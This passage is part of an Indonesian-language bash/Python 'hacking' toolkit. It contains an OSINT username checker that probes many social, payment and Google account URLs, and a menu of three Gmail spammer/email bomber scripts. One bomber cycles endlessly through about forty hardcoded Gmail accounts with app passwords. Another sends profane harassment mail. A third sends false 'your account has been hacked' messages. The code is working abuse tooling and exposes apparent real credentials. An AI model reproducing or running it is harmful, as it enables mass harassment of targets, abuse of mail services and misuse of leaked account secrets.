    ["GitHub"]="https://github.com/%s"
    ["Twitter"]="https://twitter.com/%s"
    ["Instagram"]="https://www.instagram.com/%s"
    ["SnackVideo"]="https://s.snackvideo.com/@%s"
    ["Telegram"]="https://t.me/%s"
    ["WhatsApp"]="https://wa.me/%s"
    ["Vimeo"]="https://vimeo.com/%s"
    ["YouTube"]="https://www.youtube.com/@%s"
    ["Facebook"]="https://www.facebook.com/%s"
    ["TikTok"]="https://www.tiktok.com/@%s"
    ["Reddit"]="https://www.reddit.com/user/%s"
    ["Pinterest"]="https://www.pinterest.com/%s"
    ["Steam"]="https://steamcommunity.com/id/%s"
    ["Medium"]="https://medium.com/@%s"
    ["Replit"]="https://replit.com/@%s"
    ["CodePen"]="https://codepen.io/%s"
    ["Hackerrank"]="https://www.hackerrank.com/%s"
    ["Dev.to"]="https://dev.to/%s"
    ["Keybase"]="https://keybase.io/%s"
    ["GitLab"]="https://gitlab.com/%s"
    ["Blogger"]="https://%s.blogspot.com"
    ["Dribbble"]="https://dribbble.com/%s"
    ["Behance"]="https://www.behance.net/%s"
    ["Kaggle"]="https://www.kaggle.com/%s"
    ["Last.fm"]="https://www.last.fm/user/%s"
    ["500px"]="https://500px.com/%s"
    ["PayPal"]="https://www.paypal.me/%s"
    ["Dana"]="https://link.dana.id/qr/%s"
    ["OVO"]="https://www.ovo.id/%s"
    ["GoPay"]="https://gopay.co.id/%s"
    ["ShopeePay"]="https://shopee.co.id/pay/%s"
    ["DOKU"]="https://www.doku.com/%s" 
    ["LinkAja"]="https://www.linkaja.id/%s"
    ["JeniusPay"]="https://www.jenius.com/%s"
    ["QRIS"]="https://qris.id/%s"
    ["Gcash"]="https://gcash.com/%s"
    ["Venmo"]="https://venmo.com/%s"
    ["Zelle"]="https://www.zellepay.com/%s"
    ["CashApp"]="https://cash.app/%s"
    ["Stripe"]="https://stripe.com/%s"
    ["Alipay"]="https://intl.alipay.com/%s"
    ["WeChatPay"]="https://pay.weixin.qq.com/%s"
    ["ApplePay"]="https://www.apple.com/apple-pay/%s"
    ["GooglePay"]="https://pay.google.com/%s" 
    ["Spotify"]="https://open.spotify.com/user/%s"
    ["SoundCloud"]="https://soundcloud.com/%s"
    ["RiotGames"]="https://na.op.gg/summoner/userName=%s"
    ["BuyMeACoffee"]="https://www.buymeacoffee.com/%s"
    ["TripAdvisor"]="https://www.tripadvisor.com/Profile/%s"
    ["Fiverr"]="https://www.fiverr.com/%s"
    ["Freelancer"]="https://www.freelancer.com/u/%s"
    ["Wattpad"]="https://www.wattpad.com/user/%s"
    ["Patreon"]="https://www.patreon.com/%s"
    ["Sketchfab"]="https://sketchfab.com/%s"
    ["DeviantArt"]="https://www.deviantart.com/%s"
    ["Gravatar"]="https://en.gravatar.com/%s"
    ["ProductHunt"]="https://www.producthunt.com/@%s"
    ["Flipboard"]="https://flipboard.com/@%s"
    ["About.me"]="https://about.me/%s"
    ["Disqus"]="https://disqus.com/by/%s/"
    ["Vimeo"]="https://vimeo.com/%s"
    ["Trello"]="https://trello.com/%s"
    ["Google"]="https://myaccount.google.com/?authuser=%s"
    ["Gmail"]="https://mail.google.com/mail/u/%s"
    ["Drive"]="https://drive.google.com/drive/u/%s/my-drive"
    ["Photos"]="https://photos.google.com/u/%s"
    ["ChromeSync"]="https://chrome.google.com/sync?account=%s"
    ["YouTube"]="https://www.youtube.com/channel/%s"
    ["Calendar"]="https://calendar.google.com/calendar/u/%s/r"
    ["MyAnimeList"]="https://myanimelist.net/profile/%s"
    ["Bandcamp"]="https://%s.bandcamp.com"
    ["Roblox"]="https://www.roblox.com/user.aspx?username=%s"
    ["Snapchat"]="https://www.snapchat.com/add/%s"
    ["Quora"]="https://www.quora.com/profile/%s"
    ["Linktree"]="https://linktr.ee/%s"
    ["Giphy"]="https://giphy.com/%s/"
    ["Bitbucket"]="https://bitbucket.org/%s/"
    ["OpenSea"]="https://opensea.io/%s"
    ["ArtStation"]="https://www.artstation.com/%s"
    ["ReverbNation"]="https://www.reverbnation.com/%s"
)
banner() {
echo ""
echo "
██████╗  ██████╗ ██████╗ ██╗  ██╗
██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝
██║  ██║██║   ██║██████╔╝█████╔╝ 
██║  ██║██║   ██║██╔══██╗██╔═██╗ 
██████╔╝╚██████╔╝██║  ██║██║  ██╗
╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
" | lolcat
echo -e "${p}  Development ${g}: ${c}Thxyzz404"
echo ""
}
check_username() {
    local username=$1
    echo -e "${r}[ ${g}INFO ${r}]${y} Mengecek username : $username"
    echo ""
    for site in "${!SITES[@]}"; do
        url=$(printf "${SITES[$site]}" "$username")
        status=$(curl -s -o /dev/null -w "%{http_code}" "$url")
        if [[ "$status" == "200" ]]; then
            echo -e "${r}[ ${g}✓ ${r}]${c} $site : Ditemukan → $url"
        elif [[ "$status" == "404" ]]; then
            echo -e "${r}[ ${g}x ${r}]${y} $site : Tidak Ada"
        else
            echo -e "${r}[ ${g}? ${r}]${p} $site : Tidak Pasti (Status: $status)"
        fi
    done
}
run() {
    banner
    echo -e "${g}"
    read -p "🔍 Masukkan username yang ingin dicari : " username
    echo ""
    check_username "$username"
    echo ""
    echo -e "${r}↩️ Tekan Enter untuk keluar...!!"
    read
}
run
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "39" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣤⣤⡴⣶⣶⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣷⣿⣶⣿⣧⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⠿⠿⠛⠛⠛⠋⠉⠉⠉⠛⠛⠛⠛⠿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣟⡁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠴⠿⠿⠿⣿⣿⣷⣦⡀⠀⠀⠀⠀
⠀⠀⠀⢰⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣄⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣦⣤⣤⣀⣀⣀⣀⣠⣤⠴⠖⠋⢉⣽⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⡀
⠀⠀⢠⣿⠟⠉⠁⠈⠉⠉⠙⠛⠛⠿⠿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
⠀⢠⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠽⠟⠛⠉⠀⢀⣀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣷⣶⣦⣤⣤⣤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠈⠉⠛⠿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⠘⢿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⣿⣴⣿⣿⣄⠀⠀⠀⠀⠀⣀⣠⣴⠶⣿⣿⠋⠉⠉⠉⠙⢻⣿⡆⠀⠀⠀⠀⠀⠀⣀⣴⣶⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢹⣿⡍⠛⠻⢷⣶⣶⣶⠟⢿⣿⠗⠀⠹⠃⡀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⢀⣴⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠛⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⡇⠀⠀⠀⢻⣿⣿⠀⠈⠛⠀⠀⠀⢹⠇⠀⠀⠀⠀⢶⣿⠇⠀⢀⣴⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠁⠀⠀⠀⠀⠹⡇⠀⠀⠀⠀⠀⣀⡾⠀⠀⠀⠀⠀⢸⡿⠀⣠⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⣦⠀⠀⢠⣿⢳⠀⠀⠀⠙⣿⣿⠁⢰⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⣷⡾⠿⠃⢸⣷⣀⠀⢀⣾⠃⢀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⠻⠷⢾⣿⣿⣷⡿⠁⠀⢸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣷⣄⠀⠀⠉⠛⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣦⣄⡀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣶⣶⣾⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
              echo -e "\033[31;1m╔══════════════════════════════╗"
              echo -e "\033[31;1m║\033[36;1m        SPAMMER_GMAIL      \033[31;1m   ║"
              echo -e "\033[31;1m╚══════════════════════════════╝"
              echo -e "\033[31;1m║   ${r}[ ${g}01 ${r}] ${y}Spammer_V1     ${r}     ║"
              echo -e "\033[31;1m║   ${r}[ ${g}02 ${r}] ${y}Spammer_V2     ${r}     ║"
              echo -e "\033[31;1m║   ${r}[ ${g}03 ${r}] ${y}Spammer_V3     ${r}     ║"
              echo -e "\033[31;1m║   ${r}[ ${g}04 ${r}] ${y}Kembali Ke Awall ${r}   ║"
              echo -e "\033[31;1m╔══════════════════════════════╗"
              echo -e "\033[31;1m║\033[36;1m         BY.THXYZZ404      \033[31;1m   ║"
              echo -e "\033[31;1m╚══════════════════════════════╝"
echo -e "${g}"
read -p "Masukkan pilihan Anda : " kuy
case $kuy in
1|01)
m="\033[1;31m"
p="\033[0m"
k="\033[1;33m"
b="\033[1;36m"
res="\033[0m"
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
if ! command -v boxes &> /dev/null; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} Modules blum terinstall menginstall..!!${n}"
    echo -e "${n}"
    pkg install boxes -y
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Modules sudah terinstall.${n}"
    sleep 2 
    clear 
fi
cok="ansi-rounded"
banner() {
echo -e "
${m}███████╗ ██████╗ ███╗   ███╗ █████╗ ██╗██╗${res}     
${m}██╔════╝██╔════╝ ████╗ ████║██╔══██╗██║██║${res}
${m}███████╗██║  ███╗██╔████╔██║███████║██║██║${res}     
${p}╚════██║██║   ██║██║╚██╔╝██║██╔══██║██║██║${res}     
${p}███████║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║███████╗${res}
${p}╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝${res}
${k}       [${b} DEVELOPMENT BY.THXYZZ404 ${k}]${res}
"
}
clear
banner | boxes -d "$cok"
echo -e "${g}"
echo -n "Masukkan target Gmail : "
read EMAIL_TUJUAN
echo -e "${y}"
echo -n "Masukkan subjek untuk Gmail : "
read SUBJEK
echo -e "${c}"
echo -n "Masukkan pesan untuk Gmail : "
read PESAN
python -c '
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import sys
import select
import tty
import termios
GREEN = "\033[1;32m"
RED = "\033[1;31m"
BLUE = "\033[1;34m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
RESET = "\033[0m"
accounts = [
    ["anonimousee909@gmail.com", "vwsz udcr zwtn nddt"],
    ["anonimouse90909@gmail.com", "hhgl fmji jsae sqxu"],
    ["anonimouse9099@gmail.com", "qpss riuo pkjk tmeg"],
    ["anonimouse90999@gmail.com", "ijrf hhuo jpml iysc"],
    ["aaabaaah2@gmail.com", "oqtx elxg cefv dgvd"],
    ["anjaynathan399@gmail.com", "cpil kwkt llab sodh"],
    ["joeellan26@gmail.com", "wnfe iboi ktrr uder"],
    ["bayarutangllu@gmail.com", "cbty vvaf rncu oawg"],
    ["cindyfiolita9@gmail.com", "kpvu treo hfar zqdy"],
    ["anonymousgalirus@gmail.com", "ltnc fedd qzsy lfwu"],
    ["gstorekonter4@gmail.com", "xwdq ugie fbjw xeaa"],
    ["makluetekerbpaluhekel@gmail.com", "oyys dexg uofj vhkt"],
    ["fire.send482@gmail.com", "dpus bvni hmvn caob"],
    ["jiki.mioli08@gmail.com", "gzwj sohl dzxd pteh"],
    ["tayotayooxirf@gmail.com", "edpj gvcx fehp rtfl"],
    ["tayo404tayyo404@gmail.com", "jeat hezh ditz akuk"],
    ["irfafitrio@gmail.com", "khtm tnxz nbey ahue"],
    ["sigmamewing1232@gmail.com", "trzs dett smbl iykw"],
    ["joyditiano9@gmail.com", "rnfv nfqa ggcf lyqn"],
    ["draid6247@gmail.com", "dhwm abuc vkan sofg"],
    ["daemontechx@gmail.com", "jxov iorq ztpw hirz"],
    ["daemoniumuserv2@gmail.com", "yexa nkvy ghqh hsbd"],
    ["daemoniumuser@gmail.com", "wgas iris atyy xpnc"],
    ["c26898771@gmail.com", "ykky jurp svqq kmhj"],
    ["rizkicuaca62@gmail.com", "azud gild ptqm ooip"],
    ["bunawarhadi@gmail.com", "qhub vsfb oytb qqoa"],
    ["gutodoang@gmail.com", "rcer clrw tckg ppea"],
    ["bocahbebanbocahbeban@gmail.com", "fdye aial ngai clqp"],
    ["siniluanjing484@gmail.com", "chji sayr htkq wjjz"],
    ["qoegvnv@gmail.com", "ueha fbsz unmb jqzj"],
    ["takame829@gmail.com", "firo ngvs xali pfjy"],
    ["haihakjsbsajsjnebsh5@gmail.com", "qvar taip eifk mxki"],
    ["ythead.gtrva001@gmail.com", "fdrr hjpa srza rops"],
    ["v8728799@gmail.com", "wjng geyu qrjb qrkz"],
    ["zarkymark7@gmail.com", "jlem mvwf nsog bvpq"],
    ["periport01@gmail.com", "chpo ubdi snry fafw"],
    ["reyhad52@gmail.com", "cnyo txjs jzbi hkea"],
    ["v8728799@gmail.com", "wjng geyu qrjb qrkz"],
    ["zarkymark7@gmail.com", "jlem mvwf nsog bvpq"],
]
target = "'"$EMAIL_TUJUAN"'"
subject = "'"$SUBJEK"'"
message = "'"$PESAN"'"
def loading_animation():
    chars = ["😈", "☠️", "🤬", "👹"]
    for _ in range(5):
        for char in chars:
            sys.stdout.write(f"\r{GREEN}[ 🚀 ]{CYAN} Processing..!! {RED}[ {char} {RED}]")
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write("\r" + " " * 50 + "\r")
    sys.stdout.flush()
def get_key():
    def is_data():
        return select.select([sys.stdin], [], [], 0) == ([sys.stdin], [], [])
    old_settings = termios.tcgetattr(sys.stdin)
    try:
        tty.setcbreak(sys.stdin.fileno())
        if is_data():
            key = sys.stdin.read(1)
            return key
        return None
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
print(f"\n{BLUE}╔══════════════════════════════════════════════════════╗{RESET}")
print(f"{BLUE}║         {RED}EMAIL BOMBER - THXYZZ404 CYBER TEAM          {BLUE}║{RESET}")
print(f"{BLUE}╚══════════════════════════════════════════════════════╝{RESET}")
print(f"{YELLOW}Target Gmail : {GREEN}{target}{RESET}")
print(f"{YELLOW}Subject : {GREEN}{subject}{RESET}")
print(f"{BLUE}-------------------------------------------------------{RESET}")
print(f"{CYAN}Tekan 'q' untuk menghentikan proses pengiriman{RESET}\n")
stop_flag = False
count = 0
while not stop_flag:
    for email, password in accounts:
        if stop_flag:
            break
        try:
            loading_animation()
            msg = MIMEMultipart()
            msg["From"] = email
            msg["To"] = target
            msg["Subject"] = subject
            msg.attach(MIMEText(message, "plain"))
            server = smtplib.SMTP("smtp.gmail.com", 587)
            try:
                server.starttls()
                server.login(email, password)
                server.send_message(msg)
            finally:
                server.quit()
            count += 1
            sys.stdout.write(f"\r{RED}[ {GREEN}SUKSES ATACCK {RED}]{YELLOW} Email {RED}[ {CYAN}{count} {RED}]{GREEN} {target}{RESET}")
            sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f"\r{RED}[ Gagal ] Email {count} {target}{RESET}")
            sys.stdout.flush()
        start_time = time.time()
        while time.time() - start_time < 5:
            key = get_key()
            if key and key.lower() == 'q':
                stop_flag = True
                break
            time.sleep(0.1)
sys.stdout.write("\r" + " " * 50 + "\r")
sys.stdout.flush()
print(f"\n{RED}[!] Proses dihentikan oleh pengguna.{RESET}")
print(f"{YELLOW}[i] Total email terkirim : {GREEN}{count}{RESET}")
print(f"{BLUE}╔══════════════════════════════════════════════════════╗{RESET}")
print(f"{GREEN}║         TERIMA KASIH TELAH MENGGUNAKAN TOOL INI      ║{RESET}")
print(f"{BLUE}╚══════════════════════════════════════════════════════╝{RESET}")
'
;;
 2|02)
a='\033[1;30m'
m='\033[1;31m'
h='\033[1;32m'
k='\033[1;33m'
c='\033[1;36m'
p='\033[1;37m'
r='\033[0m'
show_header() {
clear
echo -e "${a}========================================${r}"
echo -e "${m}          S P A M — G M A I L${r}"
echo -e "${a}========================================${r}"
echo ""
}
send_spam() {
local receiver=$1
local message=$2
local jumlah=$3
python3 -c "
import smtplib
import time
import os
import sys
from email.mime.text import MIMEText
from datetime import datetime
SENDER_EMAIL = 'c26898771@gmail.com'
SENDER_PASS = 'ykky jurp svqq kmhj'
receiver = '$receiver'
message_body = '$message'
jumlah = $jumlah
if jumlah > 50:
    jumlah = 50
sukses = 0
gagal = 0
start = time.time()
MERAH = '\033[1;91m'
KUNING = '\033[1;93m'
HIJAU = '\033[1;92m'
BIRU = '\033[1;94m'
RESET = '\033[0m'
CYAN = '\033[1;36m'
try:
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(SENDER_EMAIL, SENDER_PASS)    
    for i in range(jumlah):
        try:
            waktu_now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
            body_full = f'''{message_body}
Hahahaha Bakar !!
Waktu : {waktu_now}
'''
            msg = MIMEText(body_full)
            msg['Subject'] = f'HALLO NGENTOT KONTOL !! #{i+1}'
            msg['From'] = SENDER_EMAIL
            msg['To'] = receiver
            server.sendmail(SENDER_EMAIL, receiver, msg.as_string())
            durasi = 2.0
            panjang = 10
            waktu_mulai = time.time()
            indeks_warna = 0
            warna_list = [MERAH, KUNING, HIJAU, BIRU]            
            while time.time() - waktu_mulai < durasi:
                for j in range(panjang + 1):
                    if time.time() - waktu_mulai >= durasi:
                        break
                    warna = warna_list[indeks_warna % len(warna_list)]
                    terisi = warna + '■' * j + RESET
                    kosong = '□' * (panjang - j)
                    bar = f'\033[1;32m─(\033[0m\033[1;31m*\033[0m\033[1;32m)─\033[0m\033[1;31m Mengirim Spam Ke \033[0m\033[1;32m─(\033[0m\033[1;36m{receiver}\033[0m\033[1;32m)─ \033[0m\033[1;37m[[\033[0m{terisi}{kosong}\033[0m\033[1;37m]]'
                    sys.stdout.write('\r' + bar)
                    sys.stdout.flush()
                    time.sleep(0.15)
                    indeks_warna += 1           
            os.system('clear')
            sukses += 1           
        except Exception as e:
            gagal += 1
            print(f'[!] Error kirim pesan ke {receiver}: {e}')            
    server.quit()    
except Exception as e:
    print(f'[!] Gagal login/koneksi ke Gmail: {e}')
    sys.exit(1)
estimasi_waktu = jumlah * 2
real_time = int(time.time() - start)
os.system('clear')
print('\033[101m\033[1;32m:::. STATISTIK PENGIRIMAN SPAM .:::\033[0m\n')
print(f'\033[1;32m─(\033[0m\033[1;31mEstimasi Waktu\033[0m\033[1;32m)─\033[0m\033[1;33m :\033[0m \033[1;32m─(\033[0m\033[1;31m\033[0m\033[1;31m{estimasi_waktu}\033[0m\033[1;31m Detik\033[0m\033[1;32m)─')
print(f'\033[1;32m─(\033[0m\033[1;31mTotal Waktu\033[0m\033[1;32m)─\033[0m\033[1;33m :\033[0m \033[1;32m─(\033[0m\033[1;31m\033[0m\033[1;31m{real_time}\033[0m\033[1;31m Detik\033[0m\033[1;32m)─')
print(f'\033[1;32m─(\033[0m\033[1;31mPesan Terkirim\033[0m\033[1;32m)─\033[0m\033[1;33m :\033[0m \033[1;32m─(\033[0m\033[1;31m{sukses}\033[0m\033[1;32m)─')
print(f'\033[1;32m─(\033[0m\033[1;31mPesan Gagal\033[0m\033[1;32m)─\033[0m\033[1;33m :\033[0m \033[1;32m─(\033[0m\033[1;31m{gagal}\033[0m\033[1;32m)─')
print('\n\033[101m\033[1;32mSpam Berhasil Terkirim, Silahkan Enter\033[0m')
"
}
main() {
show_header    
echo -e "${h}─(${m}?${h})─${m} Masukkan Alamat Gmail Target${h} :${k} "
read -p "" receiver    
if [[ -z "$receiver" ]]; then
echo -e "${p}[${m}!${p}]${p} Email Target Tidak Boleh Kosong ${m}|${h} ENTER"
read -p ""
return
fi    
echo -e "${h}─(${m}?${h})─${m} Masukkan Isi Pesan${h} :${k} "
read -p "" message_body
if [[ -z "$message_body" ]]; then
echo -e "${p}[${m}!${p}]${p} Isi Pesan Tidak Boleh Kosong ${m}|${h} ENTER"
read -p ""
return
fi   
echo -e " ${h}─(${m}?${h})─${m} Masukkan Jumlah Pesan (Max 50)${h} :${k} "
read -p "" jumlah
if [[ -z "$jumlah" ]] || ! [[ "$jumlah" =~ ^[0-9]+$ ]]; then
echo -e "${p}[${m}!${p}]${p} Jumlah Harus Angka ${m}|${h} ENTER"
read -p ""
return
fi    
if [[ $jumlah -gt 50 ]]; then
jumlah=50
echo -e "${p}[${h}!${p}]${p} Jumlah Maksimal 50, Disesuaikan ${m}|${h} ENTER"
read -p ""
fi    
echo ""
send_spam "$receiver" "$message_body" "$jumlah"
}
main
;;
 3|03)
set +x
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
CONFIG_FILE=".config.json"
DEFAULT_SUBJECT="Thanks you for to ToolslV‼️"
format_body() {
    local user_message="$1"
    local today=$(date +"%Y - %m - %d")
    echo -e "${user_message}\n\nAkun anda telah di retas.\nDate ${today}"
}
validate_smtp_credentials() {
    local pengirim="$1"
    local password="$2"
    python3 - <<EOF
import smtplib
pengirim = "$pengirim"
password = "$password"
try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(pengirim, password)
    server.quit()
    print("Authentication successful")
except Exception as e:
    print(f"{r}[{g} !! {r}]{c} Gagal memvalidasi kredensial SMTP : {str(e)}")
    exit(1)
EOF
}
load_config() {
    clear
    echo ""
    echo "
██╗      ██████╗  ██████╗ ██╗███╗   ██╗
██║     ██╔═══██╗██╔════╝ ██║████╗  ██║
██║     ██║   ██║██║  ███╗██║██╔██╗ ██║
██║     ██║   ██║██║   ██║██║██║╚██╗██║
███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝ " | lolcat
echo ""
    if [ -f "$CONFIG_FILE" ]; then
        email=$(jq -r '.email' "$CONFIG_FILE")
        app_password=$(jq -r '.app_password' "$CONFIG_FILE")
        if [ -n "$email" ] && [ -n "$app_password" ]; then
            echo -e "${p}Konfigurasi ditemukan!"
            echo ""
            echo -e "${b}Gmail Pengirim : ${g}$email"
            echo -e "${y}Gunakan konfigurasi ini? (y/n)"
            echo ""
            echo -e -n "${r}[${g} ?? ${r}]${c} Pilih ${n}: ${g}"
            read use_existing
            if [ "$use_existing" = "y" ] || [ "$use_existing" = "Y" ]; then
                if validate_smtp_credentials "$email" "$app_password" | grep -q "Authentication successful"; then
                    export email app_password
                    return
                else
                    echo -e "${r}Kredensial tidak valid."
                fi
            fi
        else
            echo -e "${r}Konfigurasi tidak valid."
        fi
    fi
    echo -e "${g}Masukkan Alamat Gmail & App Password"
    echo -e "${g}Untuk Dijadikan Sebagai Akun Pengirim"
    echo -e "${r}Spam Gmail"
    echo ""
    echo -e "${y}Silahkan daftar dulu di:"
    echo -e "${c}Link : https://myaccount.google.com/u/1/apppasswords?pli=1&rapt=AEjHL4Orttj8WQi5YEjJrvl7LpYhVYlGUVd58Ve6UCQjr3hjF9J_rW96Kphl4S_2fsNS-_pzjs5wXTBbqaTxgK2AsnNqBadY-Y_csqsT6uIt87GGb-Prkwk&pageId=none "
    echo ""
    echo ""
    echo -e -n "${r}[${g} ?? ${r}]${c} Masukkan Sender Gmail ${n}: ${g}"
    read email
    echo ""
    echo -e -n "${r}[${g} ?? ${r}]${y} Masukkan App Password Gmail ${n}: ${g}"
    read app_password
    echo ""
    if validate_smtp_credentials "$email" "$app_password" | grep -q "Authentication successful"; then
        echo "{\"email\": \"$email\", \"app_password\": \"$app_password\"}" > "$CONFIG_FILE"
        export email app_password
    else
        clear
        echo ""
        echo -e "${r}Gagall menyimpan konfigurasi."
        echo ""
    fi
}
kirim_email() {
    local pengirim="$1"
    local password="$2"
    local penerima="$3"
    local body="$4"
    local jumlah="$5"
    python3 - <<EOF
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
pengirim = "$pengirim"
password = "$password"
penerima = "$penerima"
body = """$body"""
jumlah = int("$jumlah")
DEFAULT_SUBJECT = "$DEFAULT_SUBJECT"
body = """$(format_body "$body")"""
msg = MIMEMultipart()
msg["From"] = pengirim
msg["To"] = penerima
msg["Subject"] = DEFAULT_SUBJECT
msg.attach(MIMEText(body, "plain"))
sukses = 0
gagal = 0
start_time = time.time()
try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(pengirim, password)
    for i in range(jumlah):
        try:
            server.sendmail(pengirim, penerima, msg.as_string())
            sukses += 1
            print(f"{r}[{g} {i+1:02} {r}]{g} Pesan Sukses Terkirim ✅")
        except Exception as e:
            gagal += 1
            print(f"{r}[{g} {i+1:02} {r}]{c} Pesan Gagal ❌")
    server.quit()
except Exception as e:
    print(f"❌ {y}Gagal mengirim pesan{r} :{g} {str(e)}")
    exit(1)
end_time = time.time()
durasi = round(end_time - start_time, 2)
print("\033\ac")
print("\033[35;1m")
print("""
      ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
      ⣿⠛⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢁⠆⢻⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⡿⢻⣿
